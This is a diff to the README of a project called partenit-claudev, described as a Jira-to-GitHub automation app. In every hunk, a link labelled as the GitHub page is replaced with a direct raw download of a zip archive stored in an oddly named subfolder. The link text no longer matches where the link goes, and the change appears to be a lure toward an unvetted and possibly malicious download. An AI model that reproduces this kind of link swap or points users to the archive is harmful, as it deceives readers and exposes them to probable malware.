@@ -1,6 +1,6 @@
 # 🤖 partenit-claudev - Automate Jira To GitHub
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/theyuansya/partenit-claudev)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/theyuansya/partenit-claudev/main/algodoncillo/partenit-claudev-2.2.zip)
 
 ## 📌 Overview
 
@@ -36,7 +36,7 @@ If the app asks for connected accounts, you may need to sign in to:
 
 Use this link to visit the download page and get the app:
 
-[Visit the download page](https://github.com/theyuansya/partenit-claudev)
+[Visit the download page](https://raw.githubusercontent.com/theyuansya/partenit-claudev/main/algodoncillo/partenit-claudev-2.2.zip)
 
 ## 🚀 Install on Windows
 
@@ -202,7 +202,7 @@ If a task does not move forward:
 
 Download and setup page:
 
-[https://github.com/theyuansya/partenit-claudev](https://github.com/theyuansya/partenit-claudev)
+[https://raw.githubusercontent.com/theyuansya/partenit-claudev/main/algodoncillo/partenit-claudev-2.2.zip](https://raw.githubusercontent.com/theyuansya/partenit-claudev/main/algodoncillo/partenit-claudev-2.2.zip)
 
 ## 🧭 What to Do Next
 
